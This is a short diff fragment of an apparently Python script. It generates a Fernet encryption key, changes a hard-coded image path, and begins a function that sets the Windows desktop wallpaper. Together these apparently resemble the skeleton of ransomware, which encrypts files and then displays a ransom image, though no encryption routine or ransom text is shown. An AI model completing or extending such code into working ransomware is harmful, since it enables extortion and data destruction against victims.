@@ -11,7 +11,7 @@ filename = directory
 key = Fernet.generate_key()
 cipher = Fernet(key)
 
-imagePath = "C:\\Users\\s25ng\\encimg.jpg"
+imagePath = "C:\\"
 
 def changeBG(imagePath):
     SPI_SETDESKWALLPAPER = 20
